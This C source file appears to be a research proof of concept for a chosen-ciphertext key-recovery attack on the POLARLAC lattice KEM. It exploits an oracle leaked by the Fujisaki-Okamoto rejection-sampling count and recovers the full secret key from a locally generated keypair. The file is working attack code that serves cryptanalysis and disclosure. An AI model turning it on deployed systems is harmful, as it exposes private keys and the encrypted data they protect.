/*
 * pco_keyrecovery.c -- full secret-key recovery against POLARLAC via the
 *                      plaintext-checking oracle (PCO) leaked by the FO
 *                      rejection-sampling round count J.  "Theoretical" oracle:
 *                      the decision is J(m') == J(m*), i.e. the exact round
 *                      count, with no timing.  (See timing_fullkey.c for the
 *                      same attack driven by a real wall-clock oracle.)
 *
 * THE LEVER
 * ---------
 * Decryption computes
 *      su   = INTT( NTT(u) (*) s_hat )        (s_hat = NTT(s), stored in sk)
 *      hatm = v - su   (mod q)
 *      m'   = Decode_polar(hatm)
 * and the attacker chooses u freely (it is the c1 half of the ciphertext).
 *
 * PolarLAC uses an INCOMPLETE NTT (mq_poly_ntt stops at len==2), so the NTT
 * domain is 128 blocks of two elements and mq_poly_pointwise_mul multiplies
 * blockwise mod (X^2 - zeta).  Multiplication is therefore block-local:
 *
 *   set NTT(u) nonzero only in block i0  =>  su is driven by just TWO unknowns,
 *   s_hat[2*i0] and s_hat[2*i0+1].
 *
 * The attacker predicts su offline (pointwise-mul + INTT on the guessed block;
 * every other block is zero so the true s_hat elsewhere is irrelevant), then
 * cancels it by embedding  v[j] = target[j] + su_pred[j]  (mod q):
 *
 *   guess == truth -> hatm = target + quantization noise -> Decode(m') = m*
 *   guess != truth -> hatm = target + large pseudo-random error -> Decode != m*
 *
 * Cost: 257^2 guesses per block, 128 blocks, 2 secret polynomials.
 *
 * TWO-PHASE DISAMBIGUATION (why phase 2 is necessary, not an optimisation)
 * -----------------------------------------------------------------------
 * A wrong guess decodes to a *random* m', so P(J(m') == J(m*)) is small but
 * nonzero (~2.2 false accepts per block at j*=3).  But for the CORRECT guess
 * m' is always m* no matter how u is built, whereas a wrong guess's m' changes
 * with u.  So re-testing survivors under a DIFFERENT u construction
 * (u=(0,1) instead of u=(1,0) in the same block) keeps the true value and
 * rejects false ones with probability 1 - P(J=j*) each round.
 *
 * Usage: pco_keyrecovery        (one keygen, recover both polynomials, verify)
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "drng.h"
#include "fft.h"
#include "ntt.h"
#include "params.h"
#include "pke.h"
#include "poly.h"
#include "sample.h"
#include "symmetric.h"

/* KEM_AlgorithmInstance.c references this; provide the storage. */
DRNG_ctx drng_algorithm;

#define Q       RL_KEM_Q
#define NCOEF   RL_KEM_N
#define NVEC    RL_KEM_K
#define NM      PKE_MESSAGE_BYTES
#define NBLOCK  (RL_KEM_N / 2)

/* ------------------------------------------------------------------ */
/* J replay: mirror of derive_g() + the screened samplers in pke.c     */
/* ------------------------------------------------------------------ */
static int spectral_ok(const int16_t *p)
{
#if RL_KEM_USE_CONJ_NTT_REJECTION
    return con_poly_within_bound(p, (int32_t)CONJ_NTT_T);
#else
    return fft_within_bound_int16(p, (int32_t)RL_KEM_T);
#endif
}

static int compute_J(const uint8_t *m, const uint8_t *pk)
{
    uint8_t in[NM + PKE_PUBLIC_KEY_BYTES];
    uint8_t g[KEM_SS_BYTES + KEM_SEED_LEN_BYTES];
    uint8_t seed_enc[KEM_SEED_LEN_BYTES];
    int16_t cand[NCOEF];
    uint8_t nonce = 0;
    int extra = 0;

    memcpy(in, m, NM);
    memcpy(in + NM, pk, PKE_PUBLIC_KEY_BYTES);
    if (bit_xof((unsigned long long)((KEM_SS_BYTES + KEM_SEED_LEN_BYTES) * 8ULL),
                in, sizeof(in) * 8ULL, g) != 0) {
        return -1;
    }
    memcpy(seed_enc, g + KEM_SS_BYTES, KEM_SEED_LEN_BYTES);

    /* pke_enc: sample_screened_polyvec(r) then sample_screened_polyvec(e1) */
    for (int v = 0; v < 2; v++) {
        for (int k = 0; k < NVEC; k++) {
            for (;;) {
                poly_generate_tenary(cand, seed_enc, nonce);
                nonce = (uint8_t)(nonce + 1U);
                if (spectral_ok(cand)) {
                    break;
                }
                if (++extra > 10000) {
                    return -1;
                }
            }
        }
    }
    return extra;
}

/* ------------------------------------------------------------------ */
/* deterministic PRNG (splitmix64)                                     */
/* ------------------------------------------------------------------ */
static uint64_t rng_state = 0x9E3779B97F4A7C15ULL;

static uint64_t rnd64(void)
{
    uint64_t z = (rng_state += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

static void rnd_bytes(uint8_t *b, size_t n)
{
    for (size_t i = 0; i < n; i++) {
        b[i] = (uint8_t)(rnd64() & 0xFF);
    }
}

static int mod_q(int x)
{
    x %= Q;
    if (x < 0) {
        x += Q;
    }
    return x;
}

static double now_s(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

/* d-bit code whose decompression is closest to v (ring-aware), using the
 * backend's D_C2_BITS grid (3 bits on Light, 4 on 128). */
static uint8_t quant_dbit(int v)
{
    int ncode = 1 << D_C2_BITS;
    int half  = 1 << (D_C2_BITS - 1);
    int best_code = 0, best_dist = 1 << 30;
    for (int code = 0; code < ncode; code++) {
        int dv = (((uint32_t)code * (uint32_t)Q) + half) >> D_C2_BITS;
        int d = dv - v;
        if (d > Q / 2) { d -= Q; }
        if (d < -Q / 2) { d += Q; }
        if (d < 0) { d = -d; }
        if (d < best_dist) { best_dist = d; best_code = code; }
    }
    return (uint8_t)best_code;
}

/* ------------------------------------------------------------------ */
/* context                                                             */
/* ------------------------------------------------------------------ */
typedef struct {
    uint8_t pk[PKE_PUBLIC_KEY_BYTES];
    uint8_t sk[PKE_SECRET_KEY_BYTES];
    int16_t *s_hat;                  /* (int16_t *)sk -- NTT domain; scoring only */
    uint8_t mstar[NM];
    uint8_t code_m[RL_KEM_Lv];
    int J_star;
} ctx_t;

static void ctx_init(ctx_t *g, uint64_t seed)
{
    uint8_t seed_kg[KEM_SEED_LEN_BYTES];
    rng_state = seed;
    rnd_bytes(seed_kg, sizeof(seed_kg));
    if (PKE_KeyGen(g->pk, g->sk, seed_kg) != 0) {
        fprintf(stderr, "PKE_KeyGen failed\n");
        exit(1);
    }
    g->s_hat = (int16_t *)g->sk;
    g->J_star = 0;
}

/* pick a chosen plaintext m* whose rejection-sampling count J equals j_target
 * (a rare value gives the oracle its separation).  OFFLINE, over the public pk. */
static long search_mstar(ctx_t *g, int j_target, long trials)
{
    uint8_t m[NM];
    for (long t = 0; t < trials; t++) {
        rnd_bytes(m, sizeof(m));
        int j = compute_J(m, g->pk);
        if (j == j_target) {
            memcpy(g->mstar, m, sizeof(g->mstar));
            Encode_m(g->code_m, g->mstar);
            g->J_star = j;
            return t + 1;
        }
    }
    return -1;
}

/* ------------------------------------------------------------------ */
/* attack primitives                                                   */
/* ------------------------------------------------------------------ */

/* Attacker-side prediction of su for a guessed block value (X0,X1), given the
 * NTT-domain vector u_hat which is nonzero only in block i0:
 *   su_pred = INTT( u_hat (*) s_guess ),  s_guess zero except block i0. */
static void predict_su(int16_t *su_pred, const int16_t *u_hat,
                       int i0, int X0, int X1)
{
    int16_t s_guess[NCOEF];
    int16_t prod[NCOEF];
    memset(s_guess, 0, sizeof(s_guess));
    s_guess[2 * i0]     = (int16_t)X0;
    s_guess[2 * i0 + 1] = (int16_t)X1;
    mq_poly_pointwise_mul(prod, (int16_t *)u_hat, s_guess);
    memcpy(su_pred, prod, sizeof(prod));
    mq_poly_intt(su_pred);
}

/* Build the chosen ciphertext for one guess: c1 = u in poly `poly`, c2 encodes
 * code_m with su_pred cancelled in. */
static void build_ct(uint8_t *ct, const uint8_t *code_m,
                     const int16_t *u_coef, const int16_t *su_pred, int poly)
{
    uint8_t code_c2[RL_KEM_Lv];
    memset(ct, 0, (size_t)C1_LEN_BYTES);
    for (int i = 0; i < NCOEF; i++) {
        ct[(size_t)poly * NCOEF + i] = (uint8_t)mod_q(u_coef[i]);
    }
    for (int i = 0; i < RL_KEM_Lv; i++) {
        int target = code_m[i] ? RATIO : 0;
        code_c2[i] = quant_dbit(mod_q(target + mod_q(su_pred[i])));
    }
    pack_c2_dbit(ct + C1_LEN_BYTES, code_c2);
}

/* THE ORACLE: decapsulate the chosen ct, read the recovered plaintext's J,
 * accept iff it equals J(m*).  (No plaintext access; J is the FO leak.) */
static int oracle_j(const ctx_t *g, const uint8_t *m_dec)
{
    int j = compute_J(m_dec, g->pk);
    return (j >= 0) && (j == g->J_star);
}

/* ------------------------------------------------------------------ */
/* full recovery: both polynomials, two-phase J-oracle, then verify    */
/* ------------------------------------------------------------------ */
static int recover(ctx_t *g)
{
    int16_t uA[NCOEF], uB[NCOEF], uA_coef[NCOEF], uB_coef[NCOEF], su[NCOEF];
    int16_t rec[NVEC * NCOEF];
    uint8_t ct[PKE_CIPHERTEXT_BYTES];
    uint8_t m_dec[NM], m_test[NM];
    uint8_t seed_enc[KEM_SEED_LEN_BYTES];
    long q1 = 0, q2 = 0, sum_nc = 0;
    int blocks_ok = 0, tot = 0, no_cand = 0, still_amb = 0;
    const int total_units = NVEC * NBLOCK;
    double t_start = now_s();

    for (int poly = 0; poly < NVEC; poly++) {
        for (int i0 = 0; i0 < NBLOCK; i0++) {
            int t0 = mod_q(g->s_hat[(size_t)poly * NCOEF + 2 * i0]);
            int t1 = mod_q(g->s_hat[(size_t)poly * NCOEF + 2 * i0 + 1]);

            memset(uA, 0, sizeof(uA)); uA[2 * i0]     = 1;
            memset(uB, 0, sizeof(uB)); uB[2 * i0 + 1] = 1;
            memcpy(uA_coef, uA, sizeof(uA)); mq_poly_intt(uA_coef);
            memcpy(uB_coef, uB, sizeof(uB)); mq_poly_intt(uB_coef);

            /* phase 1: every accepted candidate under u = (1,0) */
            int cand[256][2];
            int nc = 0;
            for (int X0 = 0; X0 < Q; X0++) {
                for (int X1 = 0; X1 < Q; X1++) {
                    predict_su(su, uA, i0, X0, X1);
                    build_ct(ct, g->code_m, uA_coef, su, poly);
                    PKE_Decrypt(m_dec, ct, g->sk);
                    q1++;
                    if (oracle_j(g, m_dec)) {
                        if (nc < 256) { cand[nc][0] = X0; cand[nc][1] = X1; }
                        nc++;
                    }
                }
            }
            sum_nc += nc;

            /* phase 2: re-test survivors under the orthogonal u = (0,1) */
            int surv[256][2];
            int ns = 0;
            for (int i = 0; i < nc && i < 256; i++) {
                predict_su(su, uB, i0, cand[i][0], cand[i][1]);
                build_ct(ct, g->code_m, uB_coef, su, poly);
                PKE_Decrypt(m_dec, ct, g->sk);
                q2++;
                if (oracle_j(g, m_dec)) {
                    surv[ns][0] = cand[i][0];
                    surv[ns][1] = cand[i][1];
                    ns++;
                }
            }

            tot++;
            if (ns == 1 && surv[0][0] == t0 && surv[0][1] == t1) {
                blocks_ok++;
            } else if (ns == 0 && nc == 0) {
                no_cand++;
                printf("    block %3d poly %d: no candidate at all\n", i0, poly);
            } else {
                still_amb++;
                printf("    block %3d poly %d: phase1=%d phase2=%d true=(%d,%d) got=(%d,%d)\n",
                       i0, poly, nc, ns, t0, t1,
                       ns > 0 ? surv[0][0] : -1, ns > 0 ? surv[0][1] : -1);
            }
            rec[(size_t)poly * NCOEF + 2 * i0]     = (int16_t)(ns > 0 ? surv[0][0] : 0);
            rec[(size_t)poly * NCOEF + 2 * i0 + 1] = (int16_t)(ns > 0 ? surv[0][1] : 0);

            /* live progress: elapsed, ETA (linear extrapolation), queries */
            double el = now_s() - t_start;
            double eta = (tot > 0) ? el * (total_units - tot) / tot : 0.0;
            fprintf(stderr,
                "\r[%3d/%3d units] ok=%d  q=%ldk  elapsed=%.0fs  eta=%.0fs   ",
                tot, total_units, blocks_ok, (q1 + q2) / 1000, el, eta);
            fflush(stderr);
        }
    }
    fprintf(stderr, "\n");

    printf("\nRESULT (J-oracle, two-phase)\n");
    printf("  blocks unique+correct  : %d/%d\n", blocks_ok, tot);
    printf("  blocks still ambiguous : %d\n", still_amb);
    printf("  blocks with no cand    : %d\n", no_cand);
    printf("  phase-1 accepts/block  : %.2f  (false-positive pressure)\n",
           (double)sum_nc / (double)tot);
    printf("  PCO queries            : %ld  (phase1 %ld + phase2 %ld)\n",
           q1 + q2, q1, q2);

    int mism = 0;
    for (int i = 0; i < NVEC * NCOEF; i++) {
        if (mod_q(rec[i]) != mod_q(g->s_hat[i])) {
            mism++;
        }
    }
    printf("  sk coefficient mismatch: %d/%d\n", mism, NVEC * NCOEF);

    /* end-to-end proof: fresh honest ct, decrypt with the recovered sk */
    rnd_bytes(m_test, sizeof(m_test));
    rnd_bytes(seed_enc, sizeof(seed_enc));
    PKE_Encrypt(ct, g->pk, m_test, seed_enc);
    PKE_Decrypt(m_dec, ct, (uint8_t *)rec);
    printf("  fresh ct, recovered sk : %s\n",
           memcmp(m_dec, m_test, NM) == 0 ? "OK (plaintext recovered)" : "FAIL");
    return (mism == 0) ? 0 : 1;
}

int main(void)
{
    ctx_t g;
    ctx_init(&g, 0x1234567890ABCDEFULL);

    printf("PCO FULL-KEY RECOVERY  (oracle = FO rejection-count J)\n");
    printf("  q=%d n=%d K=%d RATIO=%d D_C2_BITS=%d blocks=%d (=%d coeffs)\n",
           Q, NCOEF, NVEC, RATIO, D_C2_BITS, NVEC * NBLOCK, NVEC * NCOEF);

    long used = search_mstar(&g, 3, 500000);
    printf("  m* with J=3            : %s (%ld trials)\n",
           used > 0 ? "found" : "NOT FOUND", used);
    if (used <= 0) {
        return 1;
    }
    return recover(&g);
}
